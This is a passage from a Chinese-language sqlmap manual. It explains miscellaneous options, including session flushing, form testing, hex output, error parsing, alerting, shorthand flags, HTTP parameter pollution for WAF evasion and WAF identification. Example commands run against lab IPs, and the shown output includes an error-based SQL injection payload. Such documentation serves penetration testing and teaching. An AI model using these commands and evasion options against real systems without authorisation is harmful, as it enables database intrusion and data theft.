<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot;</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-attr">--eta</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[hh:mm:01]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> Oracle<br><span class="hljs-comment">[hh:mm:01]</span> <span class="hljs-comment">[INFO]</span> fetching banner<br><span class="hljs-comment">[hh:mm:01]</span> <span class="hljs-comment">[INFO]</span> retrieving the length <span class="hljs-keyword">of</span> query output<br><span class="hljs-comment">[hh:mm:01]</span> <span class="hljs-comment">[INFO]</span> retrieved: 64<br>17% <span class="hljs-comment">[========&gt;                                           ]</span> 11/64<br><br>Then:<br><br>100% <span class="hljs-comment">[===================================================]</span> 64/64<br><span class="hljs-comment">[hh:mm:53]</span> <span class="hljs-comment">[INFO]</span> retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod<br><br>web application technology: PHP 5.2.6, Apache 2.2.9<br>back-end DBMS: Oracle<br>banner:<br>&#x27;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;<br></code></pre></td></tr></table></figure>
<p>如你所见，Sqlmap 先计算查询输出的长度，然后估计完成时间，最后显示百分比进度条并统计已经接受的数据。</p>
<h4 id="刷新会话文件">刷新会话文件</h4>
<blockquote>
<p>参数：<code>--flush-session</code></p>
</blockquote>
<p>使用该参数可以刷新会话文件，以避免 Sqlmap 默认的缓存机制可能造成的一些问题。使用该参数的前提是真正理解会话文件的概念。另外一个可行的方法是手工删除会话文件。</p>
<h4 id="解析和测试表单输入字段">解析和测试表单输入字段</h4>
<blockquote>
<p>参数：<code>--forms</code></p>
</blockquote>
<p>除了用<code>-r</code>和<code>--data</code>来测试表单数据是否存在注入点外，还可以使用参数<code>--forms</code>来测试表单数据是否存在注入点。</p>
<p>同时使用参数<code>--forms</code>和<code>-u</code>，Sqlmap 会解析目标 URL（<code>-u</code>指定的那个 URL）返回页面中的表单，测试表单是否有注入点，而不对目标 URL 进行注入测试。</p>
<h4 id="忽略会话文件中的查询结果">忽略会话文件中的查询结果</h4>
<blockquote>
<p>参数：-fresh-queries</p>
</blockquote>
<p>使用此参数用于忽略会话文件中的查询结果重新执行查询。</p>
<h4 id="对返回结果使用-hex-函数">对返回结果使用 HEX 函数</h4>
<blockquote>
<p>参数：<code>--hex</code></p>
</blockquote>
<p>非 ASCII 数据很容易在传输时出错，使用 hex 函数可以将目标数据库中数据以十六进制返回。</p>
<p>下例的目标是 PostgreSQL：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--banner</span> <span class="hljs-attr">--hex</span> -v <span class="hljs-number">3</span> <span class="hljs-attr">--parse-errors</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下所示：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[xx:xx:<span class="hljs-number">14</span>] [<span class="hljs-keyword">INFO</span>] fetching banner<br>[xx:xx:<span class="hljs-number">14</span>] [PAYLOAD] <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">5849</span>=CAST((CHR(<span class="hljs-number">58</span>)||CHR(<span class="hljs-number">118</span>)||CHR(<span class="hljs-number">116</span>)||CHR(<span class="hljs-number">106</span>)||CHR<br>(<span class="hljs-number">58</span>))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() <span class="hljs-keyword">AS</span> <span class="hljs-type">CHARACTER</span>(<span class="hljs-number">10000</span>)),(CHR(<span class="hljs-number">32</span>)))),(CHR(<span class="hljs-number">85</span>)||CHR(<span class="hljs-number">84</span>)||CHR(<span class="hljs-number">70</span>)||CHR(<span class="hljs-number">56</span>))),(CHR(<span class="hljs-number">72</span>)||CHR(<span class="hljs-number">69</span>)||CHR(<span class="hljs-number">88</span>))))::<span class="hljs-type">text</span>||(CHR(<span class="hljs-number">58</span>)||CHR(<span class="hljs-number">110</span>)||CHR(<span class="hljs-number">120</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">58</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br>[xx:xx:<span class="hljs-number">15</span>] [<span class="hljs-keyword">INFO</span>] parsed error message: <span class="hljs-string">&#x27;pg_query() [&lt;a href=&#x27;</span><span class="hljs-keyword">function</span>.pg-query<span class="hljs-string">&#x27;&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR: invalid input syntax for type numeric: &quot;:vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:&quot; in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;&#x27;</span><br>[xx:xx:<span class="hljs-number">15</span>] [<span class="hljs-keyword">INFO</span>] retrieved: PostgreSQL <span class="hljs-number">8.3</span><span class="hljs-number">.9</span> <span class="hljs-keyword">on</span> i486-pc-linux-gnu, compiled <span class="hljs-keyword">by</span><br>GCC gcc<span class="hljs-number">-4.3</span>.real (Debian <span class="hljs-number">4.3</span><span class="hljs-number">.2</span><span class="hljs-number">-1.1</span>) <span class="hljs-number">4.3</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure>
<h4 id="指定输出目录路径">指定输出目录路径</h4>
<blockquote>
<p>参数：<code>--output-dir</code></p>
</blockquote>
<p>Sqlmap 默认将会话文件和结果文件保存到某个子目录 output 中，可以使用此参数指定输出目录，如：<code>--output-dir=/tmp</code>。</p>
<h4 id="从响应中解析-dbms-的错误信息">从响应中解析 DBMS 的错误信息</h4>
<blockquote>
<p>参数：<code>--parse-errors</code></p>
</blockquote>
<p>若是 Web 应用被配置成 Debug 模式则很可能在 HTTP 响应页面中显示 SQL 错误信息。这些错误信息对于理解某操作失败的原因是很有用的。例如因为权限不足导致的失败错误信息是类似这样的：<code>Access denied for user</code>。</p>
<p>下例的目标是微软 SQL Server：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</span> <span class="hljs-attr">--parse-errors</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下所示：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">[xx:xx:17] [INFO] <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> technique seems to be usable. This should reduce the timeneeded to find the right number of <span class="hljs-keyword">query</span> columns. Automatically extending the rangefor current UNION <span class="hljs-keyword">query</span> injection technique <span class="hljs-keyword">test</span><br>[xx:xx:17] [INFO] parsed <span class="hljs-keyword">error</span> message: &#x27;Microsoft OLE <span class="hljs-keyword">DB</span> Provider <span class="hljs-keyword">for</span> <span class="hljs-keyword">ODBC</span> Drivers (0x80040E14)<br>[Microsoft][<span class="hljs-keyword">ODBC</span> SQL Server Driver][SQL Server]The <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> position number 10 is <span class="hljs-keyword">out</span> of <span class="hljs-keyword">range</span> of the number of items <span class="hljs-keyword">in</span> the select <span class="hljs-keyword">list</span>.<br>&lt;b&gt;/sqlmap/mssql/<span class="hljs-keyword">iis</span>/get_int.asp, <span class="hljs-keyword">line</span> 27&lt;/b&gt;&#x27;<br>[xx:xx:17] [INFO] parsed <span class="hljs-keyword">error</span> message: &#x27;Microsoft OLE <span class="hljs-keyword">DB</span> Provider <span class="hljs-keyword">for</span> <span class="hljs-keyword">ODBC</span> Drivers (0x80040E14)<br>[Microsoft][<span class="hljs-keyword">ODBC</span> SQL Server Driver][SQL Server]The <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> position number 6 is <span class="hljs-keyword">out</span> of <span class="hljs-keyword">range</span> of the number of items <span class="hljs-keyword">in</span> the select <span class="hljs-keyword">list</span>.<br>&lt;b&gt;/sqlmap/mssql/<span class="hljs-keyword">iis</span>/get_int.asp, <span class="hljs-keyword">line</span> 27&lt;/b&gt;&#x27;<br>[xx:xx:17] [INFO] parsed <span class="hljs-keyword">error</span> message: &#x27;Microsoft OLE <span class="hljs-keyword">DB</span> Provider <span class="hljs-keyword">for</span> <span class="hljs-keyword">ODBC</span> Drivers (0x80040E14)<br>[Microsoft][<span class="hljs-keyword">ODBC</span> SQL Server Driver][SQL Server]The <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> position number 4 is <span class="hljs-keyword">out</span> of <span class="hljs-keyword">range</span> of the number of items <span class="hljs-keyword">in</span> the select <span class="hljs-keyword">list</span>.<br>&lt;b&gt;/sqlmap/mssql/<span class="hljs-keyword">iis</span>/get_int.asp, <span class="hljs-keyword">line</span> 27&lt;/b&gt;&#x27;<br>[xx:xx:17] [INFO] target URL appears to have 3 columns <span class="hljs-keyword">in</span> <span class="hljs-keyword">query</span><br></code></pre></td></tr></table></figure>
<h4 id="指定中轴列">指定中轴列</h4>
<blockquote>
<p>参数：<code>--pivot-column</code></p>
</blockquote>
<p>有时（如在微软 SQL Server、Sybase 和 SAP MaxDB 中）由于缺乏类似机制不可以直接使用偏移 m,n 的方式列举数据表记录。在这种情况下，Sqlmap 通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。</p>
<p>如果自动选择失败就需要使用该参数手动指定中轴列，如：<code>--pivot-column=id</code>。</p>
<h4 id="保存选项到配置文件中">保存选项到配置文件中</h4>
<blockquote>
<p>参数：<code>--save</code></p>
</blockquote>
<p>使用该参数可以保存 Sqlmap 命令行参数到配置文件中，该文件可编辑并且可以使用参数<code>-c</code>加载。配置文件是 INI 格式的。</p>
<h4 id="升级-sqlmap">升级 Sqlmap</h4>
<blockquote>
<p>参数：<code>--update</code></p>
</blockquote>
<p>使用此参数可以升级 Sqlmap，显然，需要能够连接互联网。万一执行失败，可以在 Sqlmap 安装目录中执行<code>git pull</code>来升级 Sqlmap。在 Windows 中没有 git 命令可以使用<a target="_blank" rel="noopener" href="http://www.syntevo.com/smartgit/">SmartGit</a>之类的 git 客户端。</p>
<p>实际上<code>--update</code>和<code>git pull</code>以同样的方式升级 Sqlmap，都是从<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap.git">git 仓库</a>中获取最新源代码。</p>
<p>强烈建议在报告 bug 前先升级 Sqlmap。</p>
<h4 id="使用简写">使用简写</h4>
<p>参数：-z</p>
<p>有些参数组合是被经常用到的，如<code>--batch --random-agent --ignore-proxy --technique=BEU</code>，这样写一大串很不好看，在 Sqlmap 中，提供了一种简写的方式来缩短命令长度。</p>
<p>利用参数<code>-z</code>，每个参数都可以只写前几个字母，如<code>--batch</code>可以简写为<code>bat</code>。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--random-agent</span> <span class="hljs-attr">--ignore-proxy</span> <span class="hljs-attr">--technique</span>=BEU -u <span class="hljs-string">&quot;www.target.com/vuln.php?id=1&quot;</span><br></code></pre></td></tr></table></figure>
<p>可以简写为：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">z</span> <span class="hljs-string">&quot;bat,randoma,ign,tec=BEU&quot;</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;www.target.com/vuln.php?id=1&quot;</span><br></code></pre></td></tr></table></figure>
<p>再如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--ignore-proxy</span> <span class="hljs-attr">--flush-session</span> <span class="hljs-attr">--technique</span>=U <span class="hljs-attr">--dump</span> -D testdb -T users -u <span class="hljs-string">&quot;www.target.com/vuln.php?id=1&quot;</span><br></code></pre></td></tr></table></figure>
<p>可以简写为：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">z</span> <span class="hljs-string">&quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot;</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;www.target.com/vuln.php?id=1&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="在成功检测到注入点时报警">在成功检测到注入点时报警</h4>
<blockquote>
<p>参数：<code>--alert</code></p>
</blockquote>
<p>该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">python</span> sqlmap.py -r <span class="hljs-class"><span class="hljs-keyword">data</span>.txt `<span class="hljs-comment">--alert &quot;notify-send &#x27;找到漏洞了&#x27;&quot;`</span></span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[18:59:36] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;couno&#x27;</span> appears <span class="hljs-keyword">to</span> be <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)&#x27;</span> injectable (with <span class="hljs-attribute">--not-string</span>=<span class="hljs-string">&quot;001&quot;</span>)<br>[18:59:36] [<span class="hljs-built_in">INFO</span>] executing alerting shell command(s) (<span class="hljs-string">&#x27;notify-send &#x27;</span>找到漏洞了<span class="hljs-string">&#x27;&#x27;</span>)12<br></code></pre></td></tr></table></figure>
<p>上例中用于发出警报的命令是 Ubuntu 中的 notify-send 命令。</p>
<h4 id="设置问题的回答">设置问题的回答</h4>
<blockquote>
<p>参数：<code>--answers</code></p>
</blockquote>
<p>使用<code>--batch</code>以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数<code>--answers</code>对特定问题进行回答，若回答多个问题，以逗号分隔。如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--technique</span>=E <span class="hljs-attr">--answers</span>=<span class="hljs-string">&quot;extending=N&quot;</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[xx:xx:<span class="hljs-number">56</span>] [<span class="hljs-keyword">INFO</span>] testing <span class="hljs-keyword">for</span> <span class="hljs-keyword">SQL</span> injection <span class="hljs-keyword">on</span> <span class="hljs-keyword">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> heuristic (parsing) test showed that the back-<span class="hljs-keyword">end</span> DBMS could be <span class="hljs-string">&#x27;MySQL&#x27;</span>. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> skip test payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] Y<br>[xx:xx:<span class="hljs-number">56</span>] [<span class="hljs-keyword">INFO</span>] <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">include</span> <span class="hljs-keyword">all</span> tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;MySQL&#x27;</span> extending provided <span class="hljs-keyword">level</span> (<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> risk (<span class="hljs-number">1</span>)? [Y/n] N<br></code></pre></td></tr></table></figure>
<h4 id="在成功检测到注入点时发出嘟声">在成功检测到注入点时发出<code>嘟</code>声</h4>
<blockquote>
<p>参数：<code>--beep</code></p>
</blockquote>
<p>使用此参数可以在成功检测到注入点时发出<code>嘟</code>声。使用<code>-m</code>从日志文件中检测大量网站时该参数会格外有用。</p>
<h4 id="检查依赖">检查依赖</h4>
<blockquote>
<p>参数：<code>--dependencies</code></p>
</blockquote>
<p>Sqlmap 的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dependencies</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">[*] starting at <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span><br><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-kinterbasdb&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Firebird&#x27;</span>. Download <span class="hljs-keyword">from</span> http:<span class="hljs-comment">//kinterbasdb.sourceforge.net/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-pymssql&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Sybase&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//github.com/pymssql/pymssql</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python cx_Oracle&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Oracle&#x27;</span>. Download <span class="hljs-keyword">from</span> http:<span class="hljs-comment">//cx-oracle.sourceforge.net/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-psycopg2&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>. Download <span class="hljs-keyword">from</span> http:<span class="hljs-comment">//initd.org/psycopg/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python ibm-db&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;IBM DB2&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//github.com/ibmdb/python-ibmdb</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python jaydebeapi &amp; python-jpype&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;HSQLDB&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python ibm-db&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Informix&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//github.com/ibmdb/python-ibmdb</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-pyodbc&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Microsoft Access&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//github.com/mkleehammer/pyodbc</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-pymssql&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> directly connect <span class="hljs-keyword">to</span> the DBMS <span class="hljs-string">&#x27;Microsoft SQL Server&#x27;</span>. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//github.com/pymssql/pymssql</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-impacket&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">out</span>-<span class="hljs-keyword">of</span>-band takeover feature. Download <span class="hljs-keyword">from</span> http:<span class="hljs-comment">//code.google.com/p/impacket/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;python-ntlm&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">if</span> you plan <span class="hljs-keyword">to</span> attack a web application behind NTLM authentication. Download <span class="hljs-keyword">from</span> http:<span class="hljs-comment">//code.google.com/p/python-ntlm/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span>] [WARNING] sqlmap requires <span class="hljs-string">&#x27;websocket-client&#x27;</span> third-party <span class="hljs-keyword">library</span> <span class="hljs-keyword">if</span> you plan <span class="hljs-keyword">to</span> attack a web application <span class="hljs-keyword">using</span> WebSocket. Download <span class="hljs-keyword">from</span> https:<span class="hljs-comment">//pypi.python.org/pypi/websocket-client/</span><br><br>[*] shutting down at <span class="hljs-number">19</span>:<span class="hljs-number">16</span>:<span class="hljs-number">05</span><br></code></pre></td></tr></table></figure>
<p>可以看到我缺少的主要是用于连接数据库的第三方库。</p>
<h4 id="关闭彩色输出">关闭彩色输出</h4>
<blockquote>
<p>参数：<code>--disable-coloring</code></p>
</blockquote>
<h4 id="指定使用-google-dork-结果的某页">指定使用 Google dork 结果的某页</h4>
<blockquote>
<p>参数：<code>--gpage</code></p>
</blockquote>
<p>使用参数<code>-g</code>时默认默认选择 Google dork 结果的前 100 条做注入测试。结合使用此参数，可以指定使用 Google dork 结果的某页。</p>
<h4 id="使用-http-参数污染">使用 HTTP 参数污染</h4>
<blockquote>
<p>参数：<code>--hpp</code></p>
</blockquote>
<p>HTTP 参数污染是绕过 WAF/IPS/IDS 的一种技术，详情见<a target="_blank" rel="noopener" href="https://www.imperva.com/resources/glossary?term=http_parameter_pollution">此处</a>。这一技术针对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果怀疑目标受 WAF/IPS/IDS 保护，可以尝试用此参数进行绕过。</p>
<h4 id="彻底检测-wafipsids">彻底检测 WAF/IPS/IDS</h4>
<blockquote>
<p>参数：<code>--identify-waf</code></p>
</blockquote>
<p>Sqlmap 可以识别 WAF/IPS/IDS 以便用户进行针对性操作（如：添加<code>--tamper</code>）。目前 Sqlmap 支持检测 30 多种不同的 WAF/IPS/IDS，如 Airlock 和 Barracuda WAF 等。检测 WAF 的脚本可以在安装目录的 waf 目录中找到。</p>
<p>下例的目标是 MySQL，受 ModSecurity WAF 保护：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--identify-waf</span> -v <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[xx:xx:23] [<span class="hljs-built_in">INFO</span>] testing<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> the target URL<br>[xx:xx:23] [<span class="hljs-built_in">INFO</span>] heuristics detected web<span class="hljs-built_in"> page </span>charset <span class="hljs-string">&#x27;ascii&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">INFO</span>] using WAF scripts <span class="hljs-keyword">to</span> detect backend WAF/IPS/IDS protection<br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;USP Secure Entry Server (United Security Providers)&#x27;</span>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;BinarySEC Web Application Firewall (BinarySEC)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Hyperguard Web Application Firewall (art of defence Inc.)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Cisco ACE XML Gateway (Cisco Systems)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;TrafficShield (F5 Networks)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)&#x27;</span><br>[xx:xx:23] [<span 